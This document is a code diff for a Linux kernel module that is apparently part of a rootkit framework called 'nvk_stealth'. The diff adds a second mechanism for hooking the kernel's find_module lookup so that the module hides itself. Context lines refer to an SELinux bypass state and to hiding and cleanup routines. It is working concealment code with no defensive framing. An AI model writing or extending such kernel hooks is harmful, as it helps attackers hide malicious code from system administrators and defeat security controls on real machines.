@@ -15,9 +15,6 @@ static struct nvk_hide_state hide_state = NVK_HIDE_INIT_STATE;
 static struct nvk_selinux_bypass selinux_state;
 #endif
 
-typedef void *(*find_module_fn)(const char *name);
-static find_module_fn orig_find_module;
-
 static int nvk_str_eq(const char *a, const char *b)
 {
 	while (*a && *b) {
@@ -27,12 +24,31 @@ static int nvk_str_eq(const char *a, const char *b)
 	return *a == *b;
 }
 
+#ifdef NVK_CONTEXT_HOOK
+
+static struct nvk_hook_ctx find_module_ctx;
+
+static void hook_find_module_ctx(nvk_reg_ctx *ctx)
+{
+	const char *name = (const char *)NVK_CTX_ARG(ctx, 0);
+
+	if (name && nvk_str_eq(name, "nvk_stealth"))
+		NVK_CTX_SKIP(ctx, 0);
+}
+
+#else
+
+typedef void *(*find_module_fn)(const char *name);
+static find_module_fn orig_find_module;
+
 static void *hook_find_module(const char *name)
 {
 	if (name && nvk_str_eq(name, "nvk_stealth"))
 		return (void *)0;
 	return orig_find_module(name);
 }
+
+#endif
 
 static int nvk_stealth_init(void)
 {
@@ -58,9 +74,14 @@ static int nvk_stealth_init(void)
 
 	target = NVK_LOOKUP("find_module");
 	if (target) {
+#ifdef NVK_CONTEXT_HOOK
+		ret = nvk_hook_install_ctx(&find_module_ctx, target,
+					    hook_find_module_ctx, (void *)0);
+#else
 		ret = nvk_hook_install(&hide_state.find_module_hook,
 				       target, (void *)hook_find_module,
 				       (void **)&orig_find_module);
+#endif
 		if (ret)
 			nvk_log_warn("find_module hook: %d\n", ret);
 		else
@@ -105,6 +126,9 @@ static void nvk_stealth_exit(void)
 {
 #ifdef NVK_STEALTH_SELINUX
 	nvk_selinux_set_enforcing();
+#endif
+#ifdef NVK_CONTEXT_HOOK
+	nvk_hook_remove_ctx(&find_module_ctx);
 #endif
 	_nvk_hide_cleanup(&hide_state, &__this_module);
 	nvk_log_info("unloaded\n");
